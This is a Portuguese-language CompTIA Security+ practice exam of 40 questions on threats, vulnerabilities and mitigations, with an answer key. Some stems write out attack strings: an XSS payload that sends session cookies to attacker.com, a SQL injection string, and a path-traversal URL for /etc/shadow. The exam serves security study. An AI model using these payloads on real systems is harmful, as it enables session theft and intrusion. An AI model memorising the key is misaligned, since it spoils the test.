# 📝 Simulado Impresso - Domínio 2.0: Ameaças, Vulnerabilidades e Mitigações (40 Questões)
**Exame:** CompTIA Security+ SY0-701  
**Foco do Domínio:** Domínio 2.0 — Ameaças, Vulnerabilidades e Mitigações (Peso Oficial: 22%)  
**Instruções:** Responda às 40 questões situacionais abaixo. Todas as alternativas estão desmarcadas. O **Gabarito Oficial com Justificativas Técnicas** encontra-se exclusivamente no final do documento.

---

### Questão 1
Um analista de segurança sênior observa um aumento no volume de e-mails recebidos na organização contendo anexos PDF maliciosos. Uma análise detalhada revela que os e-mails foram enviados especificamente para cinco diretores executivos (C-Level), utilizando saudações personalizadas, referências a projetos internos confidenciais e tom de urgência financeira. Qual é a classificação EXATA desta técnica de engenharia social?

- A) Spear Phishing
- B) Whaling
- C) Vishing
- D) Pharming

---

### Questão 2
Durante uma auditoria de segurança Wi-Fi na sede corporativa, um técnico detecta um ponto de acesso não autorizado com o exato mesmo SSID ("Corporativo_Secure") e endereço MAC clonado da rede legítima. O dispositivo falso está emitindo um sinal mais forte, fazendo com que dispositivos móveis dos funcionários se conectem a ele automaticamente. Qual tipo de ameaça sem fio foi identificado?

- A) Rogue AP
- B) Evil Twin
- C) Bluejacking
- D) Jamming

---

### Questão 3
Um Centro de Operações de Segurança (SOC) identifica um ataque em andamento onde o invasor enviou milhares de solicitações de autenticação contra o portal de VPN da empresa. O ataque testou apenas uma senha extremamente comum ("Mudar123!") contra uma lista de 10.000 nomes de usuários diferentes, evitando disparar o bloqueio temporário por tentativas incorretas consecutivas. Qual técnica de ataque à autenticação foi empregada?

- A) Credential Stuffing
- B) Password Spraying
- C) Brute Force Tradicional
- D) Dictionary Attack

---

### Questão 4
Após o vazamento de um banco de dados de credenciais em um fórum da Dark Web contendo e-mails e senhas de um serviço de streaming popular, um grupo cibercriminoso utiliza uma ferramenta automatizada para testar esses mesmos pares de usuário/senha no portal do cliente de uma grande instituição financeira. Como esse vetor de ataque é categorizado?

- A) Credential Stuffing
- B) Password Spraying
- C) Rainbow Table Attack
- D) Birthday Attack

---

### Questão 5
Um analista forense investiga um incidente de malware e descobre que o código malicioso foi injetado na memória RAM de um processo legítimo do sistema operacional (`svchost.exe`). O processo original teve seu código suspenso e substituído pelo payload malicioso sem que nenhum arquivo suspeito fosse gravado no disco rígido. Qual técnica de evasão de defesa foi utilizada?

- A) DLL Sideloading
- B) Process Hollowing
- C) Buffer Overflow
- D) Reflected XSS

---

### Questão 6
Uma empresa de e-commerce é vítima de um ataque onde os usuários são redirecionados para uma cópia falsa do site de checkout ao digitarem a URL correta no navegador. A investigação revela que o invasor alterou as entradas do servidor DNS local da organização, associando o nome de domínio legítimo ao IP do servidor do atacante. Qual é a denominação correta dessa técnica?

- A) Typosquatting
- B) Pharming
- C) Watering Hole
- D) Pretexting

---

### Questão 7
Um grupo de ameaça persistente avançada (APT) descobre que funcionários do setor de pesquisa de uma empresa de defesa visitam frequentemente um fórum online especializado em engenharia aeroespacial. A APT compromete o servidor do fórum e injeta um script malicioso para infectar os computadores dos visitantes desse grupo específico. Qual nome se dá a este vetor de ataque?

- A) Spear Phishing
- B) Watering Hole Attack
- C) Drive-by Download
- D) Shoulder Surfing

---

### Questão 8
Um funcionário do departamento de compras recebe um e-mail que parece vir da equipe de TI solicitando a atualização urgente de sua senha através de um link. Ao clicar no link, ele é direcionado a uma página idêntica à do portal corporativo. Esse ataque foi direcionado apenas aos funcionários do setor de compras. Como essa variante de phishing é classificada?

- A) Whaling
- B) Spear Phishing
- C) Smishing
- D) Vishing

---

### Questão 9
Durante um teste de invasão em uma aplicação web, o profissional insere o seguinte código em um campo de formulário de busca: `<script>document.location='http://attacker.com/cookie='+document.cookie</script>`. Quando outro usuário visualiza a página de resultados da busca, seu navegador executa o script e envia seu cookie de sessão para o atacante. Qual vulnerabilidade foi explorada?

- A) SQL Injection (SQLi)
- B) Cross-Site Scripting (XSS) Refletido/Armazenado
- C) Cross-Site Request Forgery (CSRF)
- D) Server-Side Request Forgery (SSRF)

---

### Questão 10
Um invasor manipula a entrada de dados em um formulário de login digitando `' OR '1'='1` no campo de usuário e senha. O sistema valida a consulta ao banco de dados como verdadeira e concede acesso administrativo sem verificar as credenciais corretas. Qual classe de vulnerabilidade foi explorada?

- A) Command Injection
- B) SQL Injection (SQLi)
- C) LDAP Injection
- D) XML External Entity (XXE)

---

### Questão 11
Um analista de segurança analisa relatórios do SIEM e identifica conexões de rede de saída periódicas e em intervalos exatos (a cada 300 segundos) originadas de um servidor interno para um endereço IP externo na Rússia. As conexões transferem volumes muito pequenos de dados criptografados. O que esse padrão comportamental indica?

- A) Exfiltração massiva de dados
- B) Tráfego Beaconing de Comando e Controle (C2)
- C) Varredura de Portas (Port Scan)
- D) Ataque de Negação de Serviço Distribuído (DDoS)

---

### Questão 12
Durante um ataque cibernético a um hospital, os sistemas de arquivos de todos os servidores de banco de dados de prontuários foram criptografados com uma chave forte. Os atacantes deixaram um arquivo de texto na área de trabalho exigindo o pagamento de 15 Bitcoins para fornecer a chave de descriptografia. Qual tipo de malware causou esse incidente?

- A) Spyware
- B) Ransomware
- C) Trojan
- D) Rootkit

---

### Questão 13
Um técnico de TI descobre que um servidor web interno foi infectado por um software malicioso que instalou um driver em nível de kernel (Ring 0). O software oculta seus próprios processos, arquivos e chaves de registro das ferramentas padrão do sistema operacional, como o Gerenciador de Tarefas. Qual tipo de malware possui essa característica?

- A) Keylogger
- B) Rootkit
- C) Botnet
- D) Logic Bomb

---

### Questão 14
Um desenvolvedor descontente é demitido da empresa. Trinta dias após seu desligamento, um script automatizado é executado no banco de dados principal de produção, apagando todas as tabelas de clientes. A investigação aponta que o script foi programado para rodar caso a conta do desenvolvedor ficasse inativa por mais de 25 dias. Qual ameaça se concretizou?

- A) Time-of-Check to Time-of-Use (TOC/TOU)
- B) Logic Bomb (Bomba Lógica)
- C) Backdoor em Hardware
- D) Fileless Malware

---

### Questão 15
Um analista detecta um tráfego anormal em um comutador de rede (switch), onde um host malicioso enviou uma enxurrada de mensagens ARP gratuitas (*Gratuitous ARP*) associando o IP do gateway padrão ao seu próprio endereço MAC. Como resultado, todo o tráfego da sub-rede passou a ser direcionado para o host malicioso antes de ir para a Internet. Qual ataque ocorreu?

- A) DNS Poisoning
- B) ARP Spoofing / Poisoning
- C) MAC Flooding
- D) DHCP Starvation

---

### Questão 16
Em uma auditoria de segurança física, um consultor consegue entrar em uma área restrita do Data Center simplesmente caminhando logo atrás de um funcionário autorizado que utilizou seu crachá para abrir a porta mantida aberta por cortesia. Qual técnica de engenharia social física descreve esse comportamento?

- A) Piggybacking / Tailgating
- B) Shoulder Surfing
- C) Dumpster Diving
- D) Impersonation

---

### Questão 17
Um funcionário encontra um pendrive USB personalizado com o logotipo da empresa no estacionamento corporativo. Ao inseri-lo em seu estação de trabalho para identificar o dono, um script malicioso oculto é executado automaticamente, instalando uma chave de acesso remoto para um atacante. Qual método de engenharia social foi empregado?

- A) Waterboarding
- B) Baiting (Iscagem)
- C) Pretexting
- D) Quid Pro Quo

---

### Questão 18
Um atacante envia uma mensagem de texto (SMS) para o celular de vários colaboradores da equipe financeira informando que suas contas bancárias corporativas foram bloqueadas e solicitando que cliquem em um link para regularizar a situação. Como essa variante de phishing via SMS é conhecida?

- A) Vishing
- B) Smishing
- C) Whaling
- D) Skimming

---

### Questão 19
Um atacante liga para a recepção de uma empresa fingindo ser um técnico do suporte de TI terceirizado. Ele cria um cenário fictício detalhado afirmando que precisa da senha do roteador principal para corrigir uma falha de rede iminente. Qual técnica de engenharia social foca na criação dessa história fictícia para enganar a vítima?

- A) Pretexting
- B) Baiting
- C) Shoulder Surfing
- D) Eavesdropping

---

### Questão 20
Durante uma análise de vulnerabilidades em um sistema legado de controle industrial (ICS), descobre-se que duas tarefas do sistema operacional tentam acessar e modificar a mesma variável de memória simultaneamente. A ordem de execução dessas tarefas altera o resultado final de segurança do sistema. Qual classe de vulnerabilidade foi identificada?

- A) Buffer Overflow
- B) Race Condition (Condição de Corrida)
- C) Integer Overflow
- D) Memory Leak

---

### Questão 21
Uma aplicação de processamento de pedidos aceita arquivos XML enviados pelos clientes. Um invasor envia um arquivo XML contendo referências a entidades externas configuradas para ler o arquivo `/etc/passwd` do servidor e retornar o conteúdo na resposta. Qual vulnerabilidade foi explorada?

- A) XML External Entity (XXE)
- B) Cross-Site Scripting (XSS)
- C) Command Injection
- D) Server-Side Request Forgery (SSRF)

---

### Questão 22
Um analista identifica que uma aplicação web vulnerável permite que um usuário autenticado envie solicitações HTTP em nome do próprio servidor Web para acessar uma API interna que não está exposta publicamente na Internet. Qual é essa vulnerabilidade?

- A) Cross-Site Request Forgery (CSRF)
- B) Server-Side Request Forgery (SSRF)
- C) Directory Traversal
- D) Insecure Direct Object References (IDOR)

---

### Questão 23
Um invasor modifica os parâmetros da URL de uma aplicação web de `http://loja.com/download?file=documento.pdf` para `http://loja.com/download?file=../../../../etc/shadow`. O sistema retorna o arquivo de senhas do sistema operacional Linux. Qual técnica/vulnerabilidade foi executada?

- A) Directory Traversal
- B) SQL Injection
- C) Buffer Overflow
- D) Resource Exhaustion

---

### Questão 24
Durante um teste de estresse em uma aplicação C++, a entrada de dados excede o limite do buffer alocado na memória, sobrescrevendo o ponteiro de instrução (*Instruction Pointer / EIP*) e permitindo a execução de código arbitrário pelo atacante. Qual vulnerabilidade ocorreu?

- A) Memory Leak
- B) Buffer Overflow
- C) Use-After-Free
- D) Null Pointer Dereference

---

### Questão 25
Em uma pesquisa sobre atores de ameaças, uma equipe de inteligência identifica um grupo cibercriminoso altamente financiado por um governo estrangeiro, com capacidades técnicas avançadas e focado em espionagem industrial de longo prazo contra infraestruturas críticas. Como esse ator de ameaça é classificado?

- A) Hacktivist
- B) Nation-State / State-Sponsored (APT)
- C) Script Kiddie
- D) Insider Threat

---

### Questão 26
Um grupo de hacktivistas lança um ataque simultâneo utilizando milhares de dispositivos IoT infectados (câmeras IP e roteadores domésticos) para sobrecarregar a largura de banda do portal de um governo estadual com tráfego UDP falso, tornando-o indisponível. Como essa estrutura de dispositivos infectados e o ataque são chamados?

- A) Botnet e Ataque DDoS
- B) Ransomware e Ataque Man-in-the-Middle
- C) Rootkit e Ataque Spoofing
- D) Worm e Ataque de Dicionário

---

### Questão 27
Ao inspecionar os logs de acesso de um servidor Web, a equipe de segurança observa milhares de requisições de endereços IP associados a domínios registrados com nomes ligeiramente modificados de marcas famosas (ex: `g00gle.com`, `paypa1.com`). Qual técnica foi usada pelos atacantes para registrar esses domínios maliciosos?

- A) Typosquatting / URL Hijacking
- B) Domain Jacking
- C) DNS Poisoning
- D) IP Spoofing

---

### Questão 28
Um administrador de rede identifica que um invasor na mesma rede sem fio enviou quadros de gerenciamento 802.11 não criptografados (`Deauthentication Frames`) para desconectar forçadamente todos os clientes do ponto de acesso, obrigando-os a reconectar para capturar o *handshake* WPA2. Qual é o nome desse ataque?

- A) Disassociation / Deauthentication Attack
- B) Jamming Attack
- C) IV Attack
- D) Replay Attack

---

### Questão 29
Um cibercriminoso instala um pequeno dispositivo leitor de cartão oculto na entrada do leitor magnético de um caixa eletrônico (caixa 24h) juntamente com uma microcâmera para capturar o PIN digitado pelos clientes. Qual termo técnico define essa prática?

- A) Skimming
- B) Vishing
- C) Wiretapping
- D) Bluejacking

---

### Questão 30
Uma organização adota uma ferramenta de varredura de vulnerabilidades baseada no ecossistema **SCAP (Security Content Automation Protocol)**. O analista deseja avaliar a gravidade técnica de uma falha de execução remota de código recém-descoberta. Qual padrão SCAP fornece a métrica numérica de pontuação de gravidade (0 a 10)?

- A) CVE (Common Vulnerabilities and Exposures)
- B) CVSS (Common Vulnerability Scoring System)
- C) CWE (Common Weakness Enumeration)
- D) CPE (Common Platform Enumeration)

---

### Questão 31
Ao analisar a pontuação CVSS v3.1 de uma vulnerabilidade crítica, o especialista nota que a métrica do Vetor de Ataque é classificada como "Rede" (Network), a Complexidade de Ataque é "Baixa" e os Privilégios Necessários são "Nenhum". Em qual grupo de métricas do CVSS essas características estão inseridas?

- A) Pontuação Temporal
- B) Pontuação Ambiental
- C) Pontuação Base (Base Score Group)
- D) Pontuação Modificada

---

### Questão 32
Em uma avaliação de vulnerabilidades, a ferramenta de scan reporta que o servidor principal de banco de dados possui uma falha crítica de execução remota de código. No entanto, uma inspeção manual revela que a porta do serviço afetado está totalmente desativada e o serviço foi removido do servidor há meses. Como essa constatação é classificada no relatório de vulnerabilidades?

- A) Verdadeiro Positivo
- B) Falso Positivo
- C) Falso Negativo
- D) Verdadeiro Negativo

---

### Questão 33
Durante um teste de intrusão Red Team, o auditor utiliza fontes públicas como registros WHOIS, histórico de redes sociais de executivos, repositórios públicos do GitHub e pesquisas no Shodan para mapear a infraestrutura da empresa sem enviar nenhum pacote diretamente para os servidores do cliente. Qual fase e técnica foram executadas?

- A) Reconhecimento Ativo
- B) Reconhecimento Passivo / OSINT
- C) Varredura Credenciada
- D) Teste de Caixa Branca (White Box)

---

### Questão 34
Um especialista em segurança configura um sistema de prevenção de intrusões em endpoints (HIPS) para impedir a execução de qualquer software que não esteja explicitamente incluído em uma lista previamente aprovada pela equipe de segurança. Qual controle de mitigação de software foi aplicado?

- A) Lista de Aplicações Permitidas (Application Allowlisting)
- B) Lista de Bloqueio de Aplicações (Application Blocklisting)
- C) Antivírus Baseado em Assinaturas
- D) Sandboxing de Aplicação

---

### Questão 35
Uma grande empresa do setor financeiro descobre que funcionários estão utilizando ferramentas não autorizadas de armazenamento na nuvem pessoal para compartilhar arquivos de trabalho por facilidade operacional. Esse uso de tecnologia não aprovada pela equipe de TI corporativa é conhecido como:

- A) Shadow IT
- B) BYOD (Bring Your Own Device)
- C) Insider Malicioso
- D) Rogue Cloud

---

### Questão 36
Um invasor consegue capturar pacotes de dados criptografados contendo um token de autenticação transmitido via rádio frequência. Em seguida, ele retransmite exatamente os mesmos pacotes capturados para o leitor de acesso para abrir uma porta de alta segurança sem precisar decifrar o conteúdo do token. Qual ataque foi realizado?

- A) Replay Attack (Ataque de Repetição)
- B) Birthday Attack
- C) Man-in-the-Middle
- D) Downgrade Attack

---

### Questão 37
Durante uma investigação de segurança em redes sem fio, o administrador observa uma interferência contínua na frequência de 2.4 GHz gerada por um rádio transmissor malicioso de alta potência que impede totalmente a comunicação dos dispositivos Wi-Fi no escritório. Qual é este ataque físico/RF?

- A) Jamming
- B) Evil Twin
- C) War Driving
- D) Bluesnarfing

---

### Questão 38
Um analista de malware analisa um arquivo executável que não grava nenhum arquivo no disco e reside exclusivamente na memória RAM, utilizando utilitários legítimos do próprio sistema operacional (como `PowerShell.exe` e `WMI`) para executar comandos maliciosos. Como essa categoria de ameaça é denominada?

- A) Fileless Malware (Malware sem arquivo)
- B) Macro Virus
- C) Boot Sector Virus
- D) Worm de Rede

---

### Questão 39
Durante uma varredura de vulnerabilidades interna, o administrador fornece credenciais com privilégios administrativos para a ferramenta de scan (como o Nessus). Qual é a principal vantagem de realizar essa varredura credenciada em comparação com uma não credenciada?

- A) Reduzir o tempo de varredura a zero e eliminar a necessidade de atualizações
- B) Identificar vulnerabilidades internas no sistema operacional e patches ausentes com menor impacto no tráfego de rede e menos falsos positivos
- C) Garantir que nenhum tráfego de rede seja gerado durante o teste
- D) Simular exatamente a visão de um atacante externo sem acesso à rede

---

### Questão 40
Um atacante compromete uma autoridade certificadora (CA) e emite um certificado digital falso para `google.com`. Em seguida, ele realiza um envenenamento de cache DNS no roteador de um café público para interceptar todo o tráfego HTTPS dos clientes do café direcionado ao Google. Qual categoria ampla de ataque de interceptação foi executada?

- A) On-path Attack (Anteriormente Man-in-the-Middle / MitM)
- B) Side-channel Attack
- C) Cross-Site Scripting (XSS)
- D) Driver Tampering

---

## 🔑 Gabarito Oficial e Justificativas Técnicas

#### Questão 1
- **Resposta Correta:** **B) Whaling**
- **Justificativa:** O *Whaling* é uma forma altamente especializada de *Spear Phishing* direcionada exclusivamente a executivos de alto escalão (*C-Level*, diretores, executivos corporativos). Como os alvos foram cinco diretores executivos com temas financeiros e projetos confidenciais, a classificação exata é Whaling.

#### Questão 2
- **Resposta Correta:** **B) Evil Twin**
- **Justificativa:** O *Evil Twin* é um ponto de acesso Wi-Fi falso que clona o SSID e/ou endereço MAC de uma rede legítima para enganar dispositivos e fazê-los conectar automaticamente. Um *Rogue AP* é qualquer AP não autorizado conectado à rede física, mas sem necessariamente clonar a identidade de um AP legítimo.

#### Questão 3
- **Resposta Correta:** **B) Password Spraying**
- **Justificativa:** O *Password Spraying* tenta uma única senha comum (ou poucas senhas) contra um grande número de contas diferentes para evitar disparar regras de bloqueio por tentativas consecutivas incorretas em uma única conta.

#### Questão 4
- **Resposta Correta:** **A) Credential Stuffing**
- **Justificativa:** O *Credential Stuffing* utiliza ferramentas automatizadas para testar pares de usuário/senha previamente vazados em outros sites/serviços, aproveitando o hábito dos usuários de reutilizar senhas em múltiplas plataformas.

#### Questão 5
- **Resposta Correta:** **B) Process Hollowing**
- **Justificativa:** O *Process Hollowing* é uma técnica avançada de evasão onde um processo legítimo do sistema (como `svchost.exe`) é carregado em modo suspenso, seu código na memória RAM é esvaziado (*hollowed*) e substituído por código malicioso, mantendo o nome do processo legítimo.

#### Questão 6
- **Resposta Correta:** **B) Pharming**
- **Justificativa:** O *Pharming* redireciona o tráfego de usuários de um site legítimo para um site malicioso por meio da alteração da resolução de nomes (seja alterando o arquivo `hosts` local ou envenenando o servidor DNS). *Typosquatting* depende do erro de digitação do usuário.

#### Questão 7
- **Resposta Correta:** **B) Watering Hole Attack**
- **Justificativa:** No *Watering Hole Attack*, o atacante compromete um site de terceiros que é frequentemente visitado pelo grupo ou organização alvo específica (a "fonte de água"), infectando os visitantes daquela organização.

#### Questão 8
- **Resposta Correta:** **B) Spear Phishing**
- **Justificativa:** O *Spear Phishing* é um ataque de phishing personalizado e direcionado a um grupo específico, setor ou indivíduo dentro de uma organização (neste caso, especificamente aos funcionários do departamento de compras).

#### Questão 9
- **Resposta Correta:** **B) Cross-Site Scripting (XSS) Refletido/Armazenado**
- **Justificativa:** O *Cross-Site Scripting (XSS)* ocorre quando uma aplicação injeta scripts maliciosos não validados na saída enviada ao navegador do usuário, permitindo o roubo de cookies de sessão e sequestro de conta.

#### Questão 10
- **Resposta Correta:** **B) SQL Injection (SQLi)**
- **Justificativa:** A injeção de SQL ocorre quando entradas de usuário não higienizadas são concatenadas diretamente em consultas de banco de dados SQL. A string `' OR '1'='1` altera a lógica booleana da consulta para sempre ser verdadeira.

#### Questão 11
- **Resposta Correta:** **B) Tráfego Beaconing de Comando e Controle (C2)**
- **Justificativa:** O *Beaconing* são sinais periódicos e automatizados enviados por um host infectado por malware para o servidor de Comando e Controle (C2) do atacante para buscar instruções ou manter o canal de acesso ativo.

#### Questão 12
- **Resposta Correta:** **B) Ransomware**
- **Justificativa:** O *Ransomware* é uma categoria de malware que criptografa os arquivos do sistema afetado e exige o pagamento de um resgate (geralmente em criptomoedas) em troca da chave de descriptografia.

#### Questão 13
- **Resposta Correta:** **B) Rootkit**
- **Justificativa:** O *Rootkit* é projetado para obter acesso em nível de sistema/kernel e ocultar ativamente sua presença e a de outros malwares, manipulando chamadas do sistema e utilitários de diagnóstico do SO.

#### Questão 14
- **Resposta Correta:** **B) Logic Bomb (Bomba Lógica)**
- **Justificativa:** Uma *Logic Bomb* é um código malicioso inserido deliberadamente em um sistema que permanece dormente até que uma condição específica seja atingida (como uma data, evento ou inatividade de conta).

#### Questão 15
- **Resposta Correta:** **B) ARP Spoofing / Poisoning**
- **Justificativa:** O *ARP Spoofing* envia respostas ARP falsas (*Gratuitous ARP*) na rede local para associar o endereço IP do gateway ao MAC do atacante, permitindo a interceptação de todo o tráfego da rede (ataque On-path).

#### Questão 16
- **Resposta Correta:** **A) Piggybacking / Tailgating**
- **Justificativa:** *Tailgating* (ou *Piggybacking*) é a ação de seguir uma pessoa autorizada através de uma porta ou catraca restrita aproveitando a abertura legítima do crachá do outro indivíduo.

#### Questão 17
- **Resposta Correta:** **B) Baiting (Iscagem)**
- **Justificativa:** O *Baiting* envolve deixar uma mídia física infectada (como um pendrive USB) em um local estratégico, contando com a curiosidade da vítima para conectar o dispositivo na rede corporativa.

#### Questão 18
- **Resposta Correta:** **B) Smishing**
- **Justificativa:** *Smishing* é a combinação de SMS com Phishing, onde mensagens de texto fraudulentas são enviadas para celulares contendo links maliciosos ou solicitações de dados.

#### Questão 19
- **Resposta Correta:** **A) Pretexting**
- **Justificativa:** O *Pretexting* consiste em criar um cenário ou história fictícia elaborada (o "pretexto") para enganar a vítima e levá-la a revelar informações confidenciais ou conceder acesso.

#### Questão 20
- **Resposta Correta:** **B) Race Condition (Condição de Corrida)**
- **Justificativa:** Uma *Race Condition* ocorre quando o comportamento de um sistema depende da sequência ou tempo relativo de execução de processos concorrentes, podendo ser explorada para ignorar verificações de segurança (TOC/TOU).

#### Questão 21
- **Resposta Correta:** **A) XML External Entity (XXE)**
- **Justificativa:** Vulnerabilidades *XXE* ocorrem quando manipuladores de XML mal configurados processam entradas de documentos XML que contêm referências a entidades externas, permitindo leitura de arquivos locais ou ataques SSRF.

#### Questão 22
- **Resposta Correta:** **B) Server-Side Request Forgery (SSRF)**
- **Justificativa:** O *SSRF* é uma vulnerabilidade em que o atacante força o servidor Web vulnerável a realizar requisições HTTP para recursos internos restritos em nome do próprio servidor.

#### Questão 23
- **Resposta Correta:** **A) Directory Traversal**
- **Justificativa:** O *Directory Traversal* (ou *Path Traversal*) explora a falta de validação em parâmetros de arquivos para navegar pela árvore de diretórios do sistema de arquivos usando sequências como `../`.

#### Questão 24
- **Resposta Correta:** **B) Buffer Overflow**
- **Justificativa:** O *Buffer Overflow* ocorre quando uma quantidade de dados maior do que o buffer de memória alocado é gravada, sobrescrevendo limites da memória e alterando registros de execução da CPU como o ponteiro de instrução (EIP).

#### Questão 25
- **Resposta Correta:** **B) Nation-State / State-Sponsored (APT)**
- **Justificativa:** Atores de ameaça do tipo *Nation-State* (patrocinados por governos) possuem recursos financeiros massivos, alto nível de sofisticação e operam como Ameaças Persistentes Avançadas (APT).

#### Questão 26
- **Resposta Correta:** **A) Botnet e Ataque DDoS**
- **Justificativa:** Uma *Botnet* é uma rede de dispositivos comprometidos (zumbis/bots) controlados remotamente por um atacante para realizar ataques distribuídos de negação de serviço (DDoS).

#### Questão 27
- **Resposta Correta:** **A) Typosquatting / URL Hijacking**
- **Justificativa:** O *Typosquatting* registra nomes de domínios maliciosos intencionalmente parecidos com marcas populares contendo erros comuns de digitação ou substituições de caracteres (ex: `g00gle.com`).

#### Questão 28
- **Resposta Correta:** **A) Disassociation / Deauthentication Attack**
- **Justificativa:** Ataques de *Deauthentication* enviam quadros de desautenticação 802.11 falsificados para forçar a desconexão de clientes Wi-Fi legítimos para capturar o handshake de reconexão ou direcioná-los para um Evil Twin.

#### Questão 29
- **Resposta Correta:** **A) Skimming**
- **Justificativa:** *Skimming* é o uso de dispositivos físicos ilegais instalados em leitores de cartão (em caixas eletrônicos ou máquinas de cartão) para copiar os dados da tarja magnética e PINs dos clientes.

#### Questão 30
- **Resposta Correta:** **B) CVSS (Common Vulnerability Scoring System)**
- **Justificativa:** O *CVSS* é o padrão aberto mantido pelo FIRST que atribui uma pontuação numérica de gravidade (0.0 a 10.0) às vulnerabilidades com base em suas características técnicas.

#### Questão 31
- **Resposta Correta:** **C) Pontuação Base (Base Score Group)**
- **Justificativa:** As métricas de *Vetor de Ataque*, *Complexidade de Ataque*, *Privilégios Necessários* e *Interação do Usuário* compõem o grupo de métricas **Base** do CVSS v3.1, refletindo as qualidades intrínsecas da vulnerabilidade.

#### Questão 32
- **Resposta Correta:** **B) Falso Positivo**
- **Justificativa:** Um *Falso Positivo* ocorre quando uma ferramenta de segurança alerta incorretamente sobre a existência de uma vulnerabilidade ou ameaça que não está realmente presente no sistema auditado.

#### Questão 33
- **Resposta Correta:** **B) Reconhecimento Passivo / OSINT**
- **Justificativa:** O *Reconhecimento Passivo* (ou OSINT - *Open Source Intelligence*) coleta informações sobre o alvo utilizando apenas fontes públicas acessíveis sem interagir ou enviar pacotes diretamente para a infraestrutura do alvo.

#### Questão 34
- **Resposta Correta:** **A) Lista de Aplicações Permitidas (Application Allowlisting)**
- **Justificativa:** A *Lista de Aplicações Permitidas* (antiga *allowlist*) é uma abordagem de segurança rígida onde apenas executáveis explicitamente autorizados na lista podem rodar; todo o resto é bloqueado por padrão.

#### Questão 35
- **Resposta Correta:** **A) Shadow IT**
- **Justificativa:** *Shadow IT* refere-se ao uso de hardware, software, serviços em nuvem ou soluções de TI por funcionários dentro de uma organização sem o conhecimento ou aprovação formal do departamento de TI e segurança.

#### Questão 36
- **Resposta Correta:** **A) Replay Attack (Ataque de Repetição)**
- **Justificativa:** O *Replay Attack* captura uma transmissão de dados válida na rede (como um token de acesso) e a retransmite posteriormente para se autenticar fraudulentamente no sistema receptor.

#### Questão 37
- **Resposta Correta:** **A) Jamming**
- **Justificativa:** O *Jamming* é um ataque físico/RF que transmite ruído de rádio de alta potência na mesma frequência utilizada por redes sem fio (como 2.4 GHz ou 5 GHz) para degradar ou bloquear totalmente os sinais legítimos.

#### Questão 38
- **Resposta Correta:** **A) Fileless Malware (Malware sem arquivo)**
- **Justificativa:** O *Fileless Malware* opera diretamente na memória RAM sem gravar arquivos executáveis no disco rígido, utilizando utilitários e ferramentas legítimas do próprio sistema operativo (*Living off the Land*) para evitar antivírus tradicionais.

#### Questão 39
- **Resposta Correta:** **B) Identificar vulnerabilidades internas no sistema operacional e patches ausentes com menor impacto no tráfego de rede e menos falsos positivos**
- **Justificativa:** Varreduras credenciadas acessam o sistema internamente com privilégios, inspecionando diretamente registros, patches e configurações, oferecendo relatórios muito mais precisos e com menos falsos positivos do que scans externos.

#### Questão 40
- **Resposta Correta:** **A) On-path Attack (Anteriormente Man-in-the-Middle / MitM)**
- **Justificativa:** O ataque *On-path* (novo termo oficial adotado pela CompTIA SY0-701) ocorre quando o invasor se posiciona secretamente no fluxo de comunicação entre duas partes para interceptar ou alterar as mensagens trocadas.
